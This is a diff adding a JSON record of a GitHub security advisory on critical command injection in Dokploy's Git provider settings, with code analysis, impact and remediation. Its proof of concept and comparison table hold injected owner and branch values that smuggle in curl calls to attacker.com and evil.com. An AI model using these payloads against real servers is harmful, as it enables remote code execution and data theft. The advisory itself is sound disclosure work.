@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-x2p2-qq8g-2mqq",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-77"
+    ],
+    "description": "## Information\r\n- **Project:** Dokploy\r\n- **Version:** v0.29.4\r\n- **Severity:** Critical (10.0)\r\n- **Vulnerability Type:** Command Injection (CWE-77)\r\n\r\n## Description\r\nThe Dokploy server is vulnerable to command injection in the Git provider integration (GitHub, GitLab, Gitea, Bitbucket). The functions responsible for cloning repositories use string interpolation to construct shell commands. User-controlled fields such as `owner` and `repository` (for GitHub/Gitea) and `gitlabPathNamespace` (for GitLab) are not properly sanitized or validated against a strict regular expression before being passed to a shell execution environment.\r\n\r\n## Code Analysis\r\nIn [packages/server/src/utils/providers/github.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/utils/providers/github.ts):\r\n```typescript\r\nconst repoclone = `github.com/${owner}/${repository}.git`;\r\n// ...\r\nconst cloneUrl = `https://oauth2:${token}@${repoclone}`;\r\n// ...\r\ncommand += `git clone --branch ${branch} --depth 1 ${enableSubmodules ? \"--recurse-submodules\" : \"\"} ${cloneUrl} ${outputPath} --progress;`;\r\n```\r\nThe `owner` and `repository` variables are directly interpolated into the `command` string. While `branch` is validated via regex in the Zod schema, `owner` and `repository` are only validated as strings.\r\n\r\nIn the database schema [packages/server/src/db/schema/application.ts](file:///home/veronica/bot/audit/dokploy-audit/dokploy/packages/server/src/db/schema/application.ts), the `apiSaveGithubProvider` schema lacks validation for these fields.\r\n\r\n## Proof of Concept\r\n1. Navigate to an Application's Git settings.\r\n2. Set the `owner` field to: `myowner; curl http://attacker.com/$(whoami); #`\r\n3. Trigger a deployment.\r\n4. The server executes: `git clone ... https://oauth2:TOKEN@github.com/myowner; curl http://attacker.com/$(whoami); #/myrepo.git ...`\r\n5. The injected command `curl` executes on the host.\r\n\r\n## Impact\r\nFull system compromise. An attacker can execute arbitrary commands on the host system with the privileges of the Dokploy process, potentially leading to secret theft, data exfiltration, or complete host takeover.\r\n\r\n## Remediation\r\n1. **Strict Validation**: Apply alphanumeric regex validation to `owner`, `repository`, and `gitlabPathNamespace` in the Zod schemas.\r\n2. **Safe Argument Escaping**: Use a library like `shell-quote` to escape all arguments before command construction.\r\n3. **Avoid Shell Interpolation**: Use Git SDKs or child processes with argument arrays instead of raw shell strings.\r\n\r\n## How This Issue Differs from CVE-2026-45628\r\n\r\nThis vulnerability is a **distinct and separate** security issue from [CVE-2026-45628](https://nvd.nist.gov/vuln/detail/CVE-2026-45628). While both affect Dokploy and involve command injection, they target different code paths, require separate fixes, and have unique attack vectors.\r\n\r\n### 1. Different Injection Point\r\n- **CVE-2026-45628**: Primarily describes injection via **branch names** and **repository URLs** in the deployment pipeline.\r\n- **This Report**: Identifies injection via the **`owner`** and **`repository`** fields (for GitHub/Gitea) and the **`gitlabPathNamespace`** field (for GitLab).\r\n\r\n### 2. Different Affected Code Locations\r\n- **CVE-2026-45628**: Focuses on the branch interpolation in files like `git.ts`, `github.ts`, `gitlab.ts`, and `bitbucket.ts`.\r\n- **This Report**: Targets the URL construction logic in `github.ts` and `gitlab.ts` where the full clone URL is assembled using these specific, unsanitized namespace fields.\r\n\r\n### 3. Different Validation Status\r\n- **CVE-2026-45628**: Addresses the lack of validation for **branch** names.\r\n- **This Report**: Reveals that while the `branch` field is now validated (partially addressing CVE-2026-45628), the `owner`, `repository`, and `gitlabPathNamespace` fields are **not** validated and lack any regex or sanitization.\r\n\r\n### Comparison Table\r\n\r\n| Aspect | CVE-2026-45628 | This Report |\r\n|--------|----------------|-------------|\r\n| **Injection Point** | `branch` field | `owner`, `repository`, `gitlabPathNamespace` fields |\r\n| **Affected Code** | Branch interpolation | URL construction in `github.ts` and `gitlab.ts` |\r\n| **Validation Status** | Branch has regex validation | No validation for owner/repository/namespace |\r\n| **Attack Example** | `branch: \"main; curl evil.com\"` | `owner: \"myowner; curl evil.com; #\"` |\r\n| **Fix Required** | Escape branch names | Add alphanumeric regex validation |\r\n\r\n### Why This is Different\r\n\r\n1. **Different Attack Vector**: CVE-2026-45628 exploits the `branch` parameter. This exploits the `owner`, `repository`, and `gitlabPathNamespace` parameters.\r\n\r\n2. **Different Code Location**: \r\n   - CVE: Branch interpolation in command construction\r\n   - This: URL assembly in clone URL creation\r\n\r\n3. **Different Fix Required**: Fixing CVE-2026-45628 would NOT fix this issue. This requires specific alphanumeric validation for namespace fields.\r\n\r\n4. **Different Validation Gap**: The `branch` field already has validation. The `owner`, `repository`, and `gitlabPathNamespace` fields have NO validation.  @Siumauricio  can u  request for cve  id ",
+    "ghsa_id": "GHSA-x2p2-qq8g-2mqq",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-x2p2-qq8g-2mqq",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-x2p2-qq8g-2mqq"
+      }
+    ],
+    "published_at": "2026-07-21T23:25:37Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "RCE via Command Injection in Git Provider Settings",
+    "updated_at": "2026-08-11T03:41:10Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "typescript",
+          "name": "Dokploy/dokploy"
+        },
+        "patched_versions": "v0.29.5",
+        "vulnerable_version_range": "<v0.29.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
